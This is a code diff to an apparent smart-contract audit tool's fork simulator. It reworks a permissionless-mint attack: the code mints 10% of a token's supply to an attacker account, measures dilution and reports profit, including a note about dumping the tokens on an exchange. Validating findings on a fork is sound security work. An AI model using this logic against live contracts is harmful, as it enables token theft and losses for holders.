@@ -949,12 +949,35 @@ class ForkSimulator:
                     "source_finding": source_finding}
 
         if attack == "mint":
-            # state-diff: read attacker balance BEFORE the tx, then after
+            # Permissionless mint — calculate real impact, not arbitrary amount.
+            # 1) Read totalSupply to know the token economy
+            # 2) Mint a configurable percentage (default 10%) of supply
+            # 3) Calculate dilution and attacker's share
+
+            mint_pct = getattr(self, "_mint_pct", 10)  # default 10% of supply
+
+            supply_raw = self._call("totalSupply()", [], extra_from=False)
+            total_supply = self._to_int(supply_raw["stdout"])
+            steps.append({"step": "totalSupply()",
+                          "value": str(total_supply) if total_supply else "could not read"})
+            if total_supply is not None:
+                mint_amount = total_supply * mint_pct // 100
+                steps.append({"step": f"mint target ({mint_pct}% of supply)",
+                              "value": f"{mint_amount} ({mint_pct}%)"})
+            else:
+                mint_amount = 10 ** 18  # fallback: 1 token
+                steps.append({"step": "totalSupply unreadable",
+                              "value": f"falling back to 1 token ({mint_amount} wei)"})
+
             br0 = self._call("balanceOf(address)", [self.attacker], extra_from=False)
             before = self._to_int(br0["stdout"])
+            steps.append({"step": "attacker balance before",
+                          "value": str(before) if before else "0 (no prior balance)"})
+
             tried = []
+            mint_args = [self.attacker, str(mint_amount)]
             for sel, args in self._merge_candidates(
-                    [("mint(address,uint256)", [self.attacker, "1000000"])]):
+                    [("mint(address,uint256)", mint_args)]):
                 r = self._send(sel, args)
                 tried.append(f"{sel}: {'mined' if r['ok'] else 'reverted'}")
                 if r["ok"]:
@@ -963,12 +986,23 @@ class ForkSimulator:
                     steps.append({"step": sel + " sent from arbitrary account",
                                   "value": "tx mined ✅"})
                     if before is not None and bal is not None and bal != before:
-                        steps.append({"step": f"balanceOf({self.attacker[:10]}…) before → after",
-                                      "value": f"{before} → {bal}"})
+                        minted = bal - before
+                        attacker_share = (minted / total_supply * 100) if total_supply else 0
+                        steps.append({"step": f"balanceOf(attacker) before → after",
+                                      "value": f"{before} → {bal} (minted {minted})"})
+                        steps.append({"step": "attacker share of supply",
+                                      "value": f"{attacker_share:.2f}%"})
+                        if total_supply:
+                            steps.append({"step": "supply dilution",
+                                          "value": f"{total_supply} → {total_supply + minted} "
+                                                   f"(+{(minted/total_supply*100):.1f}% inflation)"})
                         return {"success": True, "attack": attack, "target": target,
-                                "profit": "Unlimited token supply minted for free",
+                                "profit": (f"Minted {minted} tokens ({attacker_share:.1f}% of supply) "
+                                          f"for free — can dump on DEX for instant profit"),
                                 "steps": steps,
-                                "evidence": f"balanceOf(attacker) {before} → {bal}",
+                                "evidence": (f"Minted {minted} tokens via {sel}; "
+                                            f"attacker balance {before} → {bal}; "
+                                            f"supply diluted by {(minted/total_supply*100) if total_supply else 0:.1f}%"),
                                 "source_finding": source_finding}
                     steps.append({"step": "balanceOf(attacker) before → after",
                                   "value": f"{before or 'read failed'} → "
